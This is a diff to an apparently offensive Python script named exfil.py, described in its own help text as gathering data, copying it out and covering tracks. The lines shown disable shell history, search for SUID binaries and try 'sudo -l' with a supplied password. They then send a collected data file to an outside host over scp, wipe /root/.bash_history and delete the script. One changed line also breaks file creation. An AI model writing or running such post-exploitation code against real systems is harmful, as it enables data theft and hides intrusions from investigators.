@@ -14,8 +14,8 @@ import argparse
 
 # get arguments for IP and password
 parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'")
-parser.add_argument("-i", "--ip", help="specify 'local IP:/path' to scp (secure copy) data file to", action="store_true", required="True")
-parser.add_argument("-p", "--password", help="specify user password if know", action="store_true")
+parser.add_argument("-i", "--ip", help="specify 'local IP:/path' to scp (secure copy) data file to", required="True")
+parser.add_argument("-p", "--password", help="specify user password if know")
 args = parser.parse_args()
 local_path = args.ip 
 password = args.password
@@ -39,7 +39,7 @@ def extract_clear(local_path):
         os.system("set +o history")
 
         # create file to write data to
-        os.system("cd /tmp/&&mkdir .data&&cd .data&&touch data_exfil.txt")
+        os.system("/tmp/data_exfil.txt")
 
         # write data to file
         print("### exfiltrating data... ###")
@@ -87,6 +87,7 @@ def extract_clear(local_path):
         os.system("find / type -f perm /4000 2>/dev/null")
 
         # exfil the data file to local machine
+        print("\n### sending data to root@{}... ###\n+input your local machine root password+".format(local_path))
         os.system("scp /tmp/data_exfil.txt root@{}".format(local_path))
         print("\n*** data_exfil.txt sent to {} ***".format(local_path))
         return
@@ -96,13 +97,14 @@ def extract_clear(local_path):
 
 
 # detect if pwd was given as option, if so, run sudo -l
-if args.password:
-    print("\n### running sudo -l: ###")
-    os.system("timeout -k 3 3 sudo -l -S {}".format(password))
-    #os.system("sudo -S < <(echo '{password}') <your sudo command>")
-else:
-    print("\n*** no password was specified, could not run 'sudo -l' ***")
-    return
+def sudo_l():
+    if args.password:
+        print("\n### attempting sudo -l: ###")
+        # trouble finding a way to run sudo -l bc it requires password input
+        #os.system("timeout -k 3 3 sudo -l -S {}".format(password))
+        #os.system("sudo -S < <(echo '{}') sudo -l".format(password))
+    else:
+        print("\n*** no password was specified, could not run 'sudo -l' ***")
 
 
 # ask to clear logs and delete script from local machine
@@ -125,7 +127,7 @@ def delete_file():
         os.system("echo ' ' > /root/.bash_history")
 
         print("\n### deleting data file and script... ###")
-        os.system("rm -rf /tmp/.data")
+        os.system("rm -f /tmp/data_exfil.txt")
         os.system("rm -f exfil.py")
         return
     else:
@@ -134,5 +136,5 @@ def delete_file():
 
 # call functions
 extract_clear(local_path)
-cred_info(password)
+sudo_l()
 delete_file()
